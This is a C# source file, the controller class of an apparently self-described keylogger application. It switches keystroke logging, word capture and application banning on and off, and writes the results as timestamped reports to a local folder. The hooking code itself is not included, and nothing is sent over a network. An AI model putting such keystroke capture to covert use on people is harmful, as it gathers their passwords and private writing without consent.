using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using reporter;

namespace keyLogger
{
    public class App
    {
        private App()
        {
            AppControl.Instance.ProcessBanned += AppControl_ProcessBanned;
            _initFiles();

        }
        
        private void AppControl_ProcessBanned(Process process)
        {

        }

        private string _keysReportFile;
        private string _wordsReportFile;
        private string _appsReportFile;

        private void _initFiles()
        {
            var date = DateTime.Now.ToString("yy-MM-dd-hh-mm-ss");
            _keysReportFile = $"Keys {date}.txt";
            _wordsReportFile = $"Words {date}.txt";
            _appsReportFile = $"Banned apps {date}.txt";
        }

        private static App _instance;
        public static App Instance => _instance ??= new App();


        
        #region Work

        public event Action StartWorking;
        public event Action StopWorking;

        private bool _logKeys;
        public bool LogKeys
        {
            get => _logKeys;
            set
            {
                _logKeys = value;
                if (!IsWorking) return;
                if(value)
                    KeyLogger.Instance.StartLogKeys();
                else
                    KeyLogger.Instance.StopLogKeys();

            }
        }

        private bool _logWords;

        public bool LogWords
        {
            get => _logWords;
            set
            {
                _logWords = value;
                if (!IsWorking) return;
                if (value)
                    KeyLogger.Instance.StartObserveWords();
                else
                    KeyLogger.Instance.StopObserveWords();

            }
        }
        private bool _banApps;

        public bool BanApps
        {
            get => _banApps;
            set
            {
                _banApps = value;
                if (!IsWorking) return;
                if (value)
                    AppControl.Instance.Start();
                else
                    AppControl.Instance.Stop();
            }
        }
        private bool _isWorking;
        private bool IsWorking
        {
            get => _isWorking;
            set
            {
                if (value)
                {
                    StartWorking?.Invoke();
                    if (LogKeys)
                    {
                        KeyLogger.Instance.StartLogKeys();
                        if(LogWords)
                            KeyLogger.Instance.StartObserveWords();
                    }
                    if (BanApps)
                        AppControl.Instance.Start();
                }
                else
                {
                    StopWorking?.Invoke();
                    KeyLogger.Instance.StopLogKeys();
                    AppControl.Instance.Stop();
                }
                _isWorking = value;
            }
        }

        public void Start()
        {
            IsWorking = true;
        }

        public void Stop()
        {
            IsWorking = false;
        }
        #endregion

        #region Report
        private string _reportDir;
        public event Action<string> ReportDirChanged;
        public string ReportDir
        {
            get => _reportDir;
            set
            {
                if (!Directory.Exists(value))
                    _setDefaultReportDir();
                else
                {
                    _reportDir = value;
                    ReportDirChanged?.Invoke(value);
                }
            }
        }
        private void _setDefaultReportDir()
        {
            ReportDir = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
        }

        public void OpenReportDir()
        {
            if (Directory.Exists(ReportDir))
                Process.Start("explorer.exe", App.Instance.ReportDir);
        }

        public event Action ReportDone;

        public void Report()
        {
            KeyLogger.ReportKeys(new FileReporter(ReportDir + "\\" + _keysReportFile));
            KeyLogger.Instance.ReportWords(new FileReporter(ReportDir + "\\" + _wordsReportFile));
            AppControl.Instance.Report(new FileReporter(ReportDir + "\\" + _appsReportFile));
            ReportDone?.Invoke();
        }
        #endregion

        private string _configPath = "config.cnf";
        public void Load()
        {
            if (!File.Exists(_configPath))
                return;
            using (var reader = new StreamReader(_configPath))
            {
                ReportDir = reader.ReadLine();
            }
        }

        public void Save()
        {
            using (var writer = new StreamWriter(_configPath))
            {
                writer.WriteLine(ReportDir);
            }
        }

    }
}
